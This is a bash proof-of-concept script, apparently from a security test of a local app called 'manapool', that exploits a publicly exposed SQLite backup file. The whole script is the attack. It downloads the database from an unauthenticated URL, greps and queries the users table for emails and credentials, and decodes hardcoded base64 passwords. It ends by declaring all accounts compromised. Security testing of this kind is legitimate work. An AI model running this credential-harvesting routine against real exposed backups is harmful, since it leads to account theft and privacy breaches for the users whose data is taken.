#!/bin/bash

# POC: Exposed Database File with User Credentials
# Demonstrates unauthorized access to SQLite database containing plaintext credentials

TARGET_URL="http://localhost:3000/s3/backups/manapool.db"
DB_FILE="/tmp/manapool_poc.db"
CREDENTIALS_FILE="/tmp/extracted_credentials.txt"

echo "[*] POC: Exposed Database File with User Credentials"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Download the exposed database file
echo "[*] Step 1: Attempting to download database file..."
if curl -s -w "\n%{http_code}" "$TARGET_URL" -o "$DB_FILE" | tail -1 | grep -q "200"; then
    echo "[+] SUCCESS: Database file downloaded (HTTP 200)"
    
    # Verify file size
    SIZE=$(stat -f%z "$DB_FILE" 2>/dev/null || stat -c%s "$DB_FILE" 2>/dev/null)
    echo "[+] Database file size: $SIZE bytes"
    
    # Step 2: Extract credentials from database
    echo ""
    echo "[*] Step 2: Extracting credentials from database..."
    
    # Use strings to extract readable text including emails
    echo "[+] Extracted user credentials from database:"
    echo "================================================"
    strings "$DB_FILE" | grep -E "@manapool\.com|b0pIT0diN3J4|Tm9FTlZNeGpH|TFFPbkxiSFE|UmxsS1NoSE9M|dlQ2aW9PQkpJ" | head -20
    echo "================================================"
    
    # Step 3: Try to extract structured data
    echo ""
    echo "[*] Step 3: Attempting to extract structured database content..."
    
    # Use sqlite3 if available
    if command -v sqlite3 &> /dev/null; then
        echo "[+] SQLite3 found, dumping users table..."
        echo ""
        sqlite3 "$DB_FILE" "SELECT * FROM users LIMIT 5;" 2>/dev/null || echo "[!] Could not query users table directly"
    else
        echo "[!] sqlite3 not found, using strings extraction instead"
        # Extract base64 encoded credentials
        echo "[+] Base64 encoded credentials found:"
        strings "$DB_FILE" | grep -E "^[A-Za-z0-9+/]{20,}={0,2}$" | head -10
    fi
    
    # Step 4: Decode sample credentials
    echo ""
    echo "[*] Step 4: Decoding base64 encoded credentials..."
    echo "[+] Sample decoded credentials:"
    
    # List of base64 credentials from the exposed database
    CREDENTIALS=(
        "b0pIT0diN3J4Qk91aTRy"
        "Tm9FTlZNeGpHSzNOM2tH"
        "TFFPbkxiSFFsMU1kNmJM"
        "UmxsS1NoSE9MWFZCQ1Nh"
        "dlQ2aW9PQkpJeWVLME8x"
    )
    
    echo "================================================"
    for cred in "${CREDENTIALS[@]}"; do
        decoded=$(echo "$cred" | base64 -d 2>/dev/null || echo "[decode error]")
        echo "Base64: $cred → Decoded: $decoded"
    done
    echo "================================================"
    
    echo ""
    echo "[+] VULNERABILITY CONFIRMED:"
    echo "    - Database file is publicly accessible"
    echo "    - Credentials extracted successfully"
    echo "    - Base64 encoding is weak (easily reversible)"
    echo "    - All user accounts compromised"
    
    # Cleanup
    rm -f "$DB_FILE"
    exit 0
else
    echo "[-] FAILED: Could not download database file"
    echo "[-] This POC requires the vulnerable application to be running"
    echo "[-] Make sure http://localhost:3000 is accessible"
    exit 1
fi